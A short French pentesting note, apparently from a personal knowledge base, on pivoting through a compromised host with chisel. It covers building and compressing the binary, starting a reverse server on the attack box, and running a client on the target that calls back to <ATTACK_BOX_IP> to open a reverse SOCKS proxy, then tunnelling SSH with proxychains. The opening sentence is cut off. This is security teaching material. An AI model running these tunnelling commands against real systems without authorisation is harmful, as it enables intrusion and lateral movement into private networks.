---
public: true # set to true to make the article publishable
---
C'est le principe d'utiliser une machine compromise pour relayer notre attaque vers 

## Installation et réduction de la taille

```shell
git clone https://github.com/jpillora/chisel.git
cd chisel
# stripping
go build -ldflags="-s -w"  # réduction de 10 Mo à 6 Mo
# sinon "static linking" (rend plus portable mais plus gros)
go build -gccgoflags="-s -w --static"
# compression
upx brute chisel # réduction de 6 à 1.5Mo
```

### Attackbox 

On commence par lancer un serveur sur notre machine (on veut que le client chisel se connecte à nous car en général les connexions sortantes sont autorisées mais pas le contraire. C'est un peu l'équivalent du côté "reverse" d'un reverse shell)

```
chisel server -p 443 --reverse
```

### Cible

On lance chisel en mode client (pour qu'il se connecte à notre serveur).
Une fois lancé, on souhaite qu'il exécute un serveur socks5.
En principe, un serveur socks s'exécute côté serveur, mais dans notre cas, on souhaite que le serveur socks s'exécute sur notre cible (donc côté client). 
On utilisera pour ce faire le `R` qui signifit "reverse" pour inverser le sens du tunnel.
On aura donc un serveur socks qui s'exécutera sur notre client et qui sera accessible depuis notre serveur sur un port qui, par défaut, sera le 1080.

```
# écoutera sur le port par défaut (1080) du serveur (attaquant) 
chisel client <ATTACK_BOX_IP>:443 R:socks

# si on souhaite modifier le port par défaut :
chisel client <ATTACK_BOX_IP>:443 R:socks:1234

```

## Utilisation

On se connectera en utlisant `proxychain`.
On commence par modifier le fichier de configuration `/etc/proxychains4.conf` et ajouter à la fin la section :

```
[ProxyList]
socks5 127.0.0.1 1080
# on peut éventuellement chainer les proxy socks sur lesquels rebondir en ajouter d'autres lignes à la suite
```

Une fois configuré, il ne reste plus qu'à préfixer nos commandes favorites de `proxychain` :

```
# Connexion SSH via le tunnel socks
proxychains ssh user@<IP_HOTE_ACCESSIBLE_DANS_LE_LAN_DE_NOTRE_CIBLE>
```